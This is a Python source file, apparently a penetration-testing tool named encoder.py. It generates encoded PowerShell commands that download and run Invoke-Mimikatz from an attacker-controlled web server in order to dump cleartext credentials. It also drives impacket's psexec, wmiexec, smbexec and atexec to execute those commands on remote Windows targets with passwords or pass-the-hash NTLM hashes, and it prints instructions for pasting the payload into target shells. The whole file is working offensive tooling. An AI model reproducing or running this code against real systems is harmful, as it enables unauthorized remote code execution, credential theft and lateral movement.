#!/usr/bin/env python

'''
Author: Christopher Duffy
Date: July 2015
Name: encoder.py
Purpose: To encode commands that execute PowerShell scripts, also provides a wrapper for 
some of the impacket examples and fixes relevant functionality

Copyright (c) 2015, Christopher Duffy & William Butler All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met: * Redistributions
of source code must retain the above copyright notice, this list of conditions and
the following disclaimer. * Redistributions in binary form must reproduce the above
copyright notice, this list of conditions and the following disclaimer in the
documentation and/or other materials provided with the distribution. * Neither the
name of the nor the names of its contributors may be used to endorse or promote
products derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
"AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL CHRISTOPHER DUFFY & WILLIAM BUTLER BE LIABLE FOR ANY DIRECT, INDIRECT,
INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
'''
import base64, sys, argparse, re

try:
    import netifaces
except:
    sys.exit("[!] Install the netifaces library: pip install netifaces")
try:
    import psexec, smbexec, atexec
    import wmiexec2 as wmiexec
except Exception as e:
    print("[!] The following error occured %s") % (e)
    sys.exit("[!] Install the necessary impacket libraries and move this script to the examples directory within it")

class Obfiscator:
    def __init__(self, src_ip, src_port, payload, function, argument, execution, dst_ip="", dst_port=""):
        self.src_ip = src_ip
        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.src_port = src_port
        self.payload = payload
        self.function = function
        self.argument = argument
        self.execution = execution
        self.command = ""
        try:
            self.run()
        except Exception, e:
            print("[!] There was an error %s") % (str(e))
            sys.exit(1)

    def run(self):
        if "invoker" in self.execution:
            # Direct invoker
            self.invoker()
        elif "download" in self.execution:
            # Direct downloader
            self.downloader()
        elif "psexec" in self.execution:
            # Direct invoker via psexec
            self.invoker_psexec()

    def packager(self, cleartext):
        encoded_utf = cleartext.encode('utf-16-le')
        encoded_base64 = base64.b64encode(encoded_utf)
        command = "powershell.exe -nop -enc %s" % (encoded_base64)
        return(command)

    def invoker(self):
        # Invoke Mimikatz Directly
        # Creates the command iex (New-Object Net.WebClient).DownloadString('http://src_ip:src_port/payload'); function -argument
        text = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s -%s" % (self.src_ip, self.src_port, self.payload, self.function, self.argument)
        self.command = self.packager(text)

    def invoker_psexec(self):
        # Invoke Mimikatz Directly
        # Creates the command iex (New-Object System.Net.WebClient).DownloadString('http://src_ip:src_port/payload'); function -argument
        pre = "powershell.exe -Command Set-ExecutionPolicy Unrestricted -Scope CurrentUser; "
        bit64 = "C:\Windows\SysWOW64\WindowsPowerShell\\v1.0\\"
        bit32 = "C:\Windows\System32\WindowsPowerShell\\v1.0\\"
        tail = "PowerShell.exe -Command iex (New-Object System.Net.WebClient).DownloadString('http://%s:%s/%s'); %s -%s" % (self.src_ip, self.src_port, self.payload, self.function, self.argument)
        text64 = bit64 + tail
        text32 = bit32 + tail
        text = pre + tail
        #powershell.exe -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://google.com/robots.txt','c:\robots.txt')}"
        self.command = text32

    def downloader(self):
        # Download String Directly
        # Creates the command iex (New-Object Net.WebClient).DownloadString('http://src_ip:src_port/payload')
        text = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/')" % (self.src_ip, self.src_port)
        self.command = self.packager(text)

    def return_command(self):
        try:
            return(self.command)
        except Exception, e:
            print("[!] There was an error %s") % (str(e))
            sys.exit(1)

def get_interfaces():
    interfaces = netifaces.interfaces()
    return interfaces

def get_gateways():
    gateway_dict = {}
    gws = netifaces.gateways()
    for gw in gws:
        try:
            gateway_iface = gws[gw][netifaces.AF_INET]
            gateway_ip, iface = gateway_iface[0], gateway_iface[1]
            gw_list =[gateway_ip, iface]
            gateway_dict[gw]=gw_list
        except:
            pass
    return gateway_dict

def get_addresses(interface):
    addrs = netifaces.ifaddresses(interface)
    link_addr = addrs[netifaces.AF_LINK]
    iface_addrs = addrs[netifaces.AF_INET]
    iface_dict = iface_addrs[0]
    link_dict = link_addr[0]
    hwaddr = link_dict.get('addr')
    iface_addr = iface_dict.get('addr')
    iface_broadcast = iface_dict.get('broadcast')
    iface_netmask = iface_dict.get('netmask')
    return hwaddr, iface_addr, iface_broadcast, iface_netmask

def get_networks(gateways_dict):
    networks_dict = {}
    for key, value in gateways_dict.iteritems():
        gateway_ip, iface = value[0], value[1]
        hwaddress, addr, broadcast, netmask = get_addresses(iface)
        network = {'gateway': gateway_ip, 'hwaddr' : hwaddress, 'addr' : addr, 'broadcast' : broadcast, 'netmask' : netmask}
        networks_dict[iface] = network
    return networks_dict

def main():
    # If script is executed at the CLI
    usage = '''usage: %(prog)s [-s IP] [-r port] [-x payload.ps1] [-a argument] [-f function] [-c interface] -i -d  -q -v -vv -vvv'''
    parser = argparse.ArgumentParser(usage=usage)
    parser.add_argument("-s", action="store", dest="src_ip", default=None, help="Set the IP address of the Mimkatz server, defaults to eth0 IP")
    parser.add_argument("-n", action="store", dest="interface", default="eth0", help="Instead of setting the IP you can extract it by interface, default eth0")
    parser.add_argument("-r", action="store", dest="src_port", default="8000", help="Set the port the Mimikatz server is on, defaults to port 8000")
    parser.add_argument("-x", action="store", dest="payload", default=None, help="The name of the Mimikatz file")
    parser.add_argument("-a", action="store", dest="mim_arg", default="DumpCreds", help="Allows you to change the argument name if the Mimikatz script was changed, defaults to DumpCreds")
    parser.add_argument("-f", action="store", dest="mim_func", default="Invoke-Mimikatz", help="Allows you to change the function name if the Mimikatz script was changed, defaults to Invoke-Mimikatz")
    parser.add_argument("-i", "--invoker", action="store_true", dest="invoker", help="Configures the command to use Mimikatz invoker")
    parser.add_argument("-l", "--downloader", action="store_true", dest="downloader", help="Configures the command to use Metasploit's exploit/multi/script/web_delivery")
    parser.add_argument("-c", "--command", action="store", dest="command", default="cmd.exe", help="Set the command that will be executed, default is cmd.exe")
    parser.add_argument("-t", action="store", dest="target", default=None, help="The system you are attempting to exploit")
    parser.add_argument("-d", action="store", dest="dom", default="WORKGROUP", help="The domain the user is apart of, defaults to WORKGROUP")
    parser.add_argument("-u", action="store", dest="usr", default="Administrator", help="The username that will be used to exploit the system, defaults to administrator")
    parser.add_argument("-p", action="store", dest="pwd", default=None, help="The password that will be used to exploit the system")
    parser.add_argument("--psexec", action="store_true", dest="psexec_cmd", help="Inject the invoker process into the system memory with psexec")
    parser.add_argument("--wmiexec", action="store_true", dest="wmiexec_cmd", help="Inject the invoker process into the system memory with wmiexec")
    parser.add_argument("--smbexec", action="store_true", dest="smbexec_cmd", help="Inject the invoker process into the system memory with smbexec")
    parser.add_argument("--atexec", action="store_true", dest="atexec_cmd", help="Inject the invoker process into the system memory with at")
    parser.add_argument("-v", action="count", dest="verbose", default=1, help="Verbosity level, defaults to one, this outputs each command and result")
    parser.add_argument("-q", action="store_const", dest="verbose", const=0, help="Sets the results to be quiet")
    parser.add_argument('--version', action='version', version='%(prog)s 0.42b')
    args = parser.parse_args()

    # Argument Validator
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    if args.invoker and args.payload == None:
        print("[!] This script requires either a command, an invoker attack, or a downloader attack")
        parser.print_help()
        sys.exit(1)

    # Set Constructors
    verbose = args.verbose             # Verbosity level
    src_port = args.src_port           # Port to source the Mimikatz script on
    src_ip = args.src_ip               # IP to source the Mimikatz script on
    payload = args.payload             # The name of the payload that will be used
    interface = args.interface         # The interface to grab the IP from
    mim_func = args.mim_func           # The function that is executed
    mim_arg = args.mim_arg             # The argument processed by the function
    invoker = args.invoker             # Holds the results for invoker execution
    downloader = args.downloader       # Holds the results for exploit/multi/script/web_delivery
    smbexec_cmd = args.smbexec_cmd     # Holds the results for smbexec execution
    wmiexec_cmd = args.wmiexec_cmd     # Holds the results for the wmiexec execution
    psexec_cmd = args.psexec_cmd       # Holds the results for the psexec execution
    atexec_cmd = args.atexec_cmd
    usr = args.usr
    pwd = args.pwd
    dom = args.dom
    target = args.target
    command = args.command
    execution = ""
    supplement = ""
    hash = None

    if ":" in pwd and pwd.count(':') == 1:
        if pwd.startswith(':'):
            LM, NTLM = pwd.split(':')
            if LM == "":
                LM = "aad3b435b51404eeaad3b435b51404ee"
        else:
            LM, NTLM = pwd.split(':')
        if re.match('[0-9A-Fa-f]{32}', LM) or re.match('[0-9A-Fa-f]{32}', NTLM):
            print("[*] Hash detected")
            blank_ntlm = re.search(r'31d6cfe0d16ae931b73c59d7e0c089c0',NTLM, re.IGNORECASE)
            blank_lm = re.search(r'aad3b435b51404eeaad3b435b51404ee',LM, re.IGNORECASE)
            blank_lm_instances = len(re.findall(r'aad3b435b51404ee', LM, re.IGNORECASE))
            bad_format = re.search(r'NOPASSWORD',LM, re.IGNORECASE)
            if bad_format:
                print("[*] The hash was badly formatted, so padding it")
                LM = "aad3b435b51404eeaad3b435b51404ee"
            if blank_lm and blank_ntlm:
                print("[*] You do know this password is blank right?")
            elif blank_lm_instances == 1 and not blank_lm:
                print("[*] The hashed password is less than eight characters")
            elif blank_lm and blank_ntlm:
                print("[*] LM hashes are disabled, so focus on cracking the NTLM")
            hash = LM + ":" + NTLM
            print("[*] Your formated hash is: %s") % (hash)
            pwd = ""

    if smbexec_cmd or wmiexec_cmd or atexec_cmd or psexec_cmd:
        if usr == None or pwd == None:
            print(2)
            sys.exit("[!] If you are trying to exploit a system you need a username, password and domain name")
        if target == None:
            print(1)
            sys.exit("[!] If you are trying to exploit a system you need at least one target")

    if invoker:
        execution = "invoker"
        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
        command = x.return_command()
    if downloader:
        execution = "downloader"
        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
        command = x.return_command()
    elif psexec_cmd and invoker:
        execution = "psexec"
        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
        command = x.return_command()
    elif invoker:
        execution = "invoker"
        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
        command = x.return_command()

    gateways = get_gateways()
    network_ifaces = get_networks(gateways)
    if src_ip == None:
        try:
           src_ip = network_ifaces[interface]['addr']
        except Exception as e:
            print("[!] No IP address found on interface %s") % (interface)

    if "invoker" in execution:
        supplement = '''[*] Place the PowerShell script ''' + payload + ''' in an empty directory.
[*] Start-up your Python web server as follows Python SimpleHTTPServer ''' + src_port + '''.'''
    elif "downloader" in execution:
        supplement = '''[*] If you have not already done this, start-up your Metasploit module exploit/multi/script/web_delivery.
[*] Make sure to select the PowerShell and copy the payload name for this script and set the URIPATH to /.'''

    instructions = supplement + '''
[*] Then copy and paste the following command into the target boxes command shell.
[*] You will have cleartext credentials as long as you have correct privileges and PowerShell access.
[*] This execution script is double encoded script.
'''

    x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
    if hash:
        if psexec_cmd:
            attack=psexec.PSEXEC(command, path="C:\\", protocols="445/SMB", username = usr, password = pwd, domain = dom, hashes = hash, copyFile = None, exeFile = None)
            attack.run(target)
        elif wmiexec_cmd:
            attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash)
            attack.run(target)
        elif smbexec_cmd:
            attack=smbexec.CMDEXEC(protocols = "445/SMB", username = usr, password = pwd, domain = dom, hashes = hash)
            attack.run(target)
        elif atexec_cmd:
            if command == "cmd.exe":
                sys.exit("[!] Please provide a viable command for execution")
            attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command)
            attack.play(target)
        else:
            print(instructions)
            print(x.return_command())
    else:
        if psexec_cmd:
            attack=psexec.PSEXEC(command, path="C:\\", protocols="445/SMB", username = usr, password = pwd, domain = dom, copyFile = None, exeFile = None)
            attack.run(target)
        elif wmiexec_cmd:
            attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom)
            attack.run(target)
        elif smbexec_cmd:
            attack=smbexec.CMDEXEC(protocols = "445/SMB", username = usr, password = pwd, domain = dom)
            attack.run(target)
        elif atexec_cmd:
            if command == "cmd.exe":
                sys.exit("[!] Please provide a viable command for execution")
            attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command)
            attack.play(target)
        else:
            print(instructions)
            print(x.return_command())

if __name__ == '__main__':
    main()
